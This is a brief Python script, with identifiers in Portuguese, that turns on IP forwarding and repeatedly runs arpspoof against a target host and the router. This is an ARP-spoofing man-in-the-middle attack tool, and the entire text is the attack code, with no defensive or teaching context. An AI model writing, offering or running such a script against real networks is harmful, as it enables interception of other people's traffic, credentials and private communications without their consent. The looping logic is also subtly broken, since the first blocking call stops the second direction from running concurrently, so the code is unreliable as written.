import os
import subprocess

def habilitar_ip_forwarding():
    with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
        f.write("1")

def executar_arpspoof(interface, alvo, roteador):
    try:
        while True:
            subprocess.run(["arpspoof", "-i", interface, "-t", alvo, roteador], check=True)
            subprocess.run(["arpspoof", "-i", interface, "-t", roteador, alvo], check=True)
    except KeyboardInterrupt:
        print("\nARP Spoofing interrompido pelo usuário.")
